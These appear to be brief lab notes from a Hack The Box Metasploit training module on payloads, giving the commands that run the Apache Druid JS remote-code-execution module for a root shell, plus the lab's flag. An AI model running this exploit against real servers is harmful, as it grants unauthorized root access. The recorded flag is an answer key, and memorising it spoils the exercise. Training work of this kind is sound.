# Module 39 — Using The Metasploit Framework
## Section 6: Payloads

**Target:** Apache Druid instance

**Exploit chain:**
```
use exploit/linux/http/apache_druid_js_rce
set RHOSTS <target>
set LHOST <your-tun0-ip>
exploit
```
Gives a root shell directly (Apache Druid JS RCE).

**Flag:** `HTB{MSF_Expl01t4t10n}`
